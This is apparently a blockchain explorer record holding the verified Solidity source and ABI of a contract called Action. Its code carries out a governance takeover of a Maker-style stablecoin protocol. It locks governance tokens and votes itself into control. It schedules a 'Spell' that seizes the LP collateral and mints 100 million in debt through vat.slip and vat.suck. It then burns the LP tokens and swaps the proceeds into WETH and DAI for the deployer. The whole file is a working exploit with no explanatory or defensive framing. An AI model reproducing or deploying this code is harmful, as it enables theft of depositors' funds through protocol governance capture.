{"SourceCode": "pragma solidity ^0.8.23;\r\n\r\ninterface IERC20 {\r\n    function balanceOf(address account) external view returns (uint256);\r\n    function transfer(address to, uint256 amount) external returns (bool);\r\n    function approve(address spender, uint256 amount) external returns (bool);\r\n}\r\n\r\ninterface IDSChief {\r\n    function lock(uint wad) external;\r\n    function vote(address[] memory yays) external returns (bytes32);\r\n    function lift(address whom) external;\r\n    function free(uint wad) external;\r\n}\r\n\r\ninterface IDSPause {\r\n    function plot(address usr, bytes32 tag, bytes memory fax, uint eta) external;\r\n    function exec(address usr, bytes32 tag, bytes memory fax, uint eta) external returns (bytes memory out);\r\n}\r\n\r\ninterface IVat {\r\n    function slip(bytes32 ilk, address usr, int256 wad) external;\r\n    function suck(address u, address v, uint rad) external;\r\n    function hope(address usr) external;\r\n}\r\n\r\ninterface IJoin {\r\n    function exit(address usr, uint wad) external;\r\n}\r\n\r\ninterface IUsdtERC20 {\r\n    function balanceOf(address account) external view returns (uint256);\r\n    function transfer(address to, uint256 amount) external;\r\n    function approve(address spender, uint value) external;\r\n}\r\n\r\ninterface IPair is IERC20 {\r\n    function burn(address to) external returns (uint amount0, uint amount1);\r\n}\r\n\r\ninterface IRouter {\r\n    function swapExactTokensForTokens(\r\n        uint amountIn,\r\n        uint amountOutMin,\r\n        address[] calldata path,\r\n        address to,\r\n        uint deadline\r\n    ) external returns (uint[] memory amounts);\r\n}\r\n\r\ncontract Spell {\r\n    function act(address user) public {\r\n        IVat vat = IVat(0x694532928Af9288F83AACBa5B932caf51fEC22d5);\r\n        IERC20 lp0 = IERC20(0x3041CbD36888bECc7bbCBc0045E3B1f144466f5f);\r\n        IERC20 lp1 = IERC20(0xB20bd5D04BE54f870D5C0d3cA85d82b34B836405);\r\n        IJoin gemJoin0 = IJoin(0x1B9C400E36239c2649391c0179D9C3799c94fA6F);\r\n        IJoin gemJoin1 = IJoin(0x8c0929691A458f454cf3438Cf2EF8Bc901a72CcA);\r\n        IJoin daiJoin = IJoin(0x1856298fAD423F63158A3ED1c7d98490840E6C14);\r\n\r\n        bytes32 ilk0 = 0x55534454555344432d4100000000000000000000000000000000000000000000;\r\n        bytes32 ilk1 = 0x555344544441492d410000000000000000000000000000000000000000000000;\r\n        \r\n        vat.slip(ilk0, address(this), int256(lp0.balanceOf(0x1B9C400E36239c2649391c0179D9C3799c94fA6F)));\r\n        vat.slip(ilk1, address(this), int256(lp1.balanceOf(0x8c0929691A458f454cf3438Cf2EF8Bc901a72CcA)));\r\n        vat.suck(address(this), address(this), 100000000 * 10 ** 18 * 10 ** 27);\r\n        \r\n        vat.hope(address(daiJoin));\r\n        gemJoin0.exit(user, lp0.balanceOf(0x1B9C400E36239c2649391c0179D9C3799c94fA6F));\r\n        gemJoin1.exit(user, lp1.balanceOf(0x8c0929691A458f454cf3438Cf2EF8Bc901a72CcA));\r\n        daiJoin.exit(user, 100000000 ether);\r\n    }\r\n}\r\n\r\ncontract Action {\r\n    IERC20 fl = IERC20(0xfFED56a180f23fD32Bc6A1d8d3c09c283aB594A8);\r\n    IDSChief chief = IDSChief(0x72FaD6ffF363ec7f39136331416491Aba01EAF4a);\r\n    IDSPause pause = IDSPause(0x146921eF7A94C50b96cb53Eb9C2CA4EB25D4Bfa8);\r\n    IPair usdcUsdt = IPair(0x3041CbD36888bECc7bbCBc0045E3B1f144466f5f);\r\n    IPair daiUsdt = IPair(0xB20bd5D04BE54f870D5C0d3cA85d82b34B836405);\r\n    IERC20 usdc = IERC20(0xA0b86991c6218b36c1d19D4a2e9Eb0cE3606eB48);\r\n    IUsdtERC20 usdt = IUsdtERC20(0xdAC17F958D2ee523a2206206994597C13D831ec7);\r\n    IERC20 dai = IERC20(0x6B175474E89094C44Da98b954EedeAC495271d0F);\r\n    IERC20 usdFl = IERC20(0x2B4200A8D373d484993C37d63eE14AeE0096cd12);\r\n    IRouter router = IRouter(0x7a250d5630B4cF539739dF2C5dAcb4c659F2488D);\r\n    IERC20 weth = IERC20(0xC02aaA39b223FE8D0A0e5C4F27eAD9083C756Cc2);\r\n    IERC20 iou = IERC20(0xe167b66d5F8692f6fF9de36137B9155345384c3C);\r\n    uint delay;\r\n    bytes32 tag;\r\n    bytes sig;\r\n    Spell spell;\r\n\r\n    address public fans;\r\n    constructor() {\r\n        fans = msg.sender;\r\n    }\r\n\r\n    modifier onlyFans {\r\n        require(fans == msg.sender, \"not fans\");\r\n        _;\r\n    }\r\n\r\n    function start(uint amount) external onlyFans {\r\n        fl.approve(address(chief), amount);\r\n        chief.lock(amount);\r\n        address[] memory yays = new address[](1);\r\n        yays[0] = address(this);\r\n        chief.vote(yays);\r\n        chief.lift(address(this));\r\n\r\n        spell = new Spell();\r\n        address spelladdr = address(spell);\r\n        bytes32 _tag; assembly { _tag := extcodehash(spelladdr) }\r\n        tag = _tag;\r\n        delay = block.timestamp + 259200;\r\n        sig = abi.encodeWithSignature(\"act(address)\", address(this));\r\n        pause.plot(address(spell), tag, sig, delay);\r\n    }\r\n\r\n    function starter() external onlyFans {\r\n        pause.exec(address(spell), tag, sig, delay);\r\n    }\r\n\r\n    function startest(uint wethMin, uint daiMin) external onlyFans {\r\n        usdcUsdt.transfer(address(usdcUsdt), usdcUsdt.balanceOf(address(this)));\r\n        daiUsdt.transfer(address(daiUsdt), daiUsdt.balanceOf(address(this)));\r\n        usdcUsdt.burn(address(this));\r\n        daiUsdt.burn(address(this));\r\n\r\n        address[] memory path = new address[](2);\r\n        path[0] = address(usdFl);\r\n        path[1] = address(usdc);\r\n        usdFl.approve(address(router), type(uint256).max);\r\n        usdt.approve(address(router), type(uint256).max);\r\n        usdc.approve(address(router), type(uint256).max);\r\n        router.swapExactTokensForTokens(\r\n            50000000 ether,\r\n            0,\r\n            path,\r\n            address(this),\r\n            block.timestamp\r\n        );\r\n\r\n        path[1] = address(usdt);\r\n        router.swapExactTokensForTokens(\r\n            10000000 ether,\r\n            0,\r\n            path,\r\n            address(this),\r\n            block.timestamp\r\n        );\r\n\r\n        path[0] = address(usdc);\r\n        path[1] = address(weth);\r\n        router.swapExactTokensForTokens(\r\n            usdc.balanceOf(address(this)),\r\n            0,\r\n            path,\r\n            address(this),\r\n            block.timestamp\r\n        );\r\n\r\n        path[0] = address(usdt);\r\n        router.swapExactTokensForTokens(\r\n            usdt.balanceOf(address(this)),\r\n            0,\r\n            path,\r\n            address(this),\r\n            block.timestamp\r\n        );\r\n\r\n        address[] memory daiPath = new address[](2);\r\n        daiPath[0] = address(usdFl);\r\n        daiPath[1] = address(dai);\r\n        router.swapExactTokensForTokens(\r\n            40000000 ether,\r\n            0,\r\n            daiPath,\r\n            address(this),\r\n            block.timestamp\r\n        );\r\n        \r\n        require(weth.balanceOf(address(this)) >= wethMin);\r\n        require(dai.balanceOf(address(this)) >= daiMin);\r\n        weth.transfer(fans, weth.balanceOf(address(this)));\r\n        dai.transfer(fans, dai.balanceOf(address(this)));\r\n    }\r\n\r\n    function free(uint256 amount) external onlyFans {\r\n        iou.approve(address(chief), amount);\r\n        chief.free(amount);\r\n    }\r\n\r\n    function rescue(IERC20 token) external onlyFans {\r\n        token.transfer(fans, token.balanceOf(address(this)));\r\n    }\r\n}", "ABI": "[{\"inputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"constructor\"},{\"inputs\":[],\"name\":\"fans\",\"outputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"uint256\",\"name\":\"amount\",\"type\":\"uint256\"}],\"name\":\"free\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"contract IERC20\",\"name\":\"token\",\"type\":\"address\"}],\"name\":\"rescue\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"uint256\",\"name\":\"amount\",\"type\":\"uint256\"}],\"name\":\"start\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"starter\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"uint256\",\"name\":\"wethMin\",\"type\":\"uint256\"},{\"internalType\":\"uint256\",\"name\":\"daiMin\",\"type\":\"uint256\"}],\"name\":\"startest\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"}]", "ContractName": "Action", "CompilerVersion": "v0.8.23+commit.f704f362", "OptimizationUsed": "0", "Runs": "200", "ConstructorArguments": "", "EVMVersion": "Default", "Library": "", "LicenseType": "None", "Proxy": "0", "Implementation": "", "SwarmSource": "ipfs://5c0714d2be911e663403eaa28b258cea5ed8797dd9b4a411bf372febe6db9c0f"}